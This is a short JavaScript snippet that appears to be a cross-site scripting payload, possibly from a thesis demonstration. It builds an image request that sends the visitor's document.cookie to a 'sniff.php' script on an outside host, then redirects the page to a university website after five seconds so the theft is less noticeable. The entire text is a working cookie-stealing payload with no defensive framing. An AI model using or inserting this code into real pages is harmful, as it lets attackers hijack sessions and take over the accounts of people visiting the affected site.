img = new Image();
img.src = 'http://pracadyplomowa/scripts/sniff.php?cookie='+document.cookie;
function redirect() {
    location = 'https://www.vistula.edu.pl/'
}
setTimeout(redirect,5000);